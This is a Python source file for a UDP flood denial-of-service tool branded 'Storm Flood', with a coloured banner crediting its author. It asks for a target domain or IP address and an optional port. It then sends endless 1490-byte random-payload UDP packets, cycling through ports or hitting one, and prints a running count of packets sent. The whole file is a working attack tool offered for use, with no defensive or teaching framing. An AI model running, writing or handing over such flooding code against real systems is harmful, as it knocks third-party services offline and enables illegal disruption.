
# Import.
from platform import system
from tqdm.auto import tqdm
import os
import time
import random
import socket


# Version.
version = "1.2"


# Platform info
uname = system()

if uname == "Windows":
    cmd_clear = 'cls'
else:
    cmd_clear = 'clear'

os.system(cmd_clear)


# Logo with multiple colors
print('''\033[91m
  ____  _                         \033[93m_____ _                 _ \033[0m
 \033[92m/ ___|| |_ ___  _ __ _ __ ___   |  ___| | ___   ___   __| |\033[0m
 \033[94m\___ \| __/ _ \| '__| '_ ` _ \  | |_  | |/ _ \ / _ \ / _` |\033[0m
 \033[95m ___) | || (_) | |  | | | | | | |  _| | | (_) | (_) | (_| |\033[0m
 \033[96m|____/ \__\___/|_|  |_| |_| |_| |_|   |_|\___/ \___/ \__,_|\033[0m
\033[91m
|----------------------------------------------------------------------------|
| \033[92mCreated By: Sayantan Saha\033[0m                                                  |
| \033[93mCheckout my LinkedIn: https://www.linkedin.com/in/mastersayantan/\033[0m          |
| \033[94mLookup at my GitHub Account: https://github.com/MasterSayantan\033[0m             |
|----------------------------------------------------------------------------|
\033[0m''')

# Socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)


# Strom DDoS_Tool
while True:
    # UI.
    print("\033[92;1m")
    print("1. Website Domain\n2. IP Address\n3. Exit")
    print('\033[0m')

    # Input.
    opt = str(input("\n> "))

    # Selection.
    if opt == '1':
        domain = str(input("Domain:"))
        ip = socket.gethostbyname(domain)
        break

    elif opt == '2':
        ip = str(input("IP Address: "))
        break

    elif opt == '3':
        exit()

    else:
        print('\033[91mInvalid Choice!\033[0m')
        time.sleep(2)
        os.system(cmd_clear)


# Port selection.
port_mode = False  # If 'False' all ports will be used, if 'True' - certain.
port = 2

while 1:
    port_bool = str(input("Certain port? [y/n]: "))

    if (port_bool == "y") or (port_bool == "Y"):
        port_mode = True
        port = int(input("Port: "))
        break

    elif (port_bool == "n") or (port_bool == "N"):
        break

    else:
        print('\033[91mInvalid Choice!\033[0m')
        time.sleep(2)


# Starting work.
os.system(cmd_clear)
print('\033[36;2mINITIALIZING....')
time.sleep(1)
print('STARTING...')
time.sleep(4)

sent = 0

if port_mode == False:  # All ports.
    try:
        while True:
            if port == 65534:
                port = 1

            elif port == 1900:
                port = 1901

            sock.sendto(bytes, (ip, port))
            sent += 1
            port += 1
            print("\033[32;1mSent %s packets to %s through port:%s" % (sent, ip, port))
    except:
        print('\n\033[31;1mExited\033[0m')

elif port_mode == True:  # Certain port.
    if port < 2:
        port = 2

    elif port == 65534:
        port = 2

    elif port == 1900:
        port = 1901

    try:
        while True:
            sock.sendto(bytes, (ip, port))
            sent += 1
            print("\033[32;1mSent %s packets to %s through port:%s" % (sent, ip, port))      
    except:
        print('\n\033[31;1mExited\033[0m')
